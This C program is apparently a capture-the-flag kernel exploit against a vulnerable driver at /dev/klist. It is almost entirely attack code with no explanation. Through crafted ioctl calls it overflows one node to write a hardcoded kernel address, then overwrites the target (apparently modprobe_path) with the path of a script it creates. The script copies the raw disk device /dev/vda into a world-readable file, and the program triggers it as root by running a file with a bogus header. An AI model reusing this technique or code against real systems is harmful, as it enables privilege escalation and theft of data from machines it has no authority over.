#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define CMD_ADD    0x40606B00
#define CMD_ACTION 0x40686B01

#define DEVICE_PATH "/dev/klist"

struct add_args {
    char data[96];
};

struct action_args {
    uint32_t index;
    uint32_t size;
    char data[96];
};

char * u64_to_bytes(uint64_t x) {
    char * bytes = (char *)malloc(8);
    for (int i = 0; i < 8; i++) bytes[i] = (x >> (i * 8)) & 0xff;
    return bytes;
}

int main() {
    system(
        "echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > "
        "/tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open device");
        return -1;
    }
    printf("[+] Device opened successfully.\n");

    struct add_args args1;
    memset(&args1, 0, sizeof(args1));
    memset(args1.data, 'A', 80);

    if (ioctl(fd, CMD_ADD, &args1) < 0) {
        perror("[-] Failed to add Node 1");
        close(fd);
        return -1;
    }

    struct add_args args2;
    memset(&args2, 0, sizeof(args2));
    memset(args2.data, 'B', 80);

    if (ioctl(fd, CMD_ADD, &args2) < 0) {
        perror("[-] Failed to add Node 2");
        close(fd);
        return -1;
    }

    struct action_args attack_args;
    memset(&attack_args, 0, sizeof(attack_args));

    attack_args.index = 0;
    attack_args.size = 24;

    memset(attack_args.data, 'C', 16);
    memcpy(attack_args.data + 16, u64_to_bytes(0xffffffff82b426e0), 8);
    ioctl(fd, CMD_ACTION, &attack_args);
    memset(&attack_args, 0, sizeof(attack_args));
    attack_args.index = 1;
    attack_args.size = 8;
    memcpy(attack_args.data, "/tmp/x\x00", 7);
    ioctl(fd, CMD_ACTION, &attack_args);
    printf("[+] Exploit finished.\n");
    system("/tmp/dummy");
    system("cat /tmp/flag");
    getchar();
    // close(fd);
    return 0;
}